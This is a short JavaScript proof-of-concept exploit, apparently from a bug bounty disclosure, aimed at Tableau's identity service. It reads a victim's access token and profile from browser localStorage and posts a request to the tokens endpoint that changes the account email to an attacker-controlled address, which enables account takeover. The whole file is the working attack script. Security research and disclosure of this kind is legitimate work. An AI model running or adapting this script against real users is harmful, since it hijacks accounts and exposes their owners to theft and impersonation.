const url = 'https://id.tableau.com/api/4.0/tokens';

const uid = JSON.parse(localStorage.user_profile).uid;
const type = "changeEmail";
const token = localStorage.access_token 
const attacker_email = "kfoleysanchez+attackerpoc@wearehackerone.com"
const victim_email = JSON.parse(localStorage.user_profile).email 

const headers = {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
};

const data = {
    uid: uid,
    type: type,
    email: attacker_email
};

const xhr = new XMLHttpRequest();

xhr.open('POST', url, true);

for (let header in headers) {
    xhr.setRequestHeader(header, headers[header]);
}

xhr.onload = function() {
    if (xhr.status == 200) {
        console.log(`Email of ${victim_email} changed to: ${attacker_email}`);
    } else {
        console.error('Request failed with status code:', xhr.status);
    }
};

const jsonData = JSON.stringify(data);
xhr.send(jsonData);
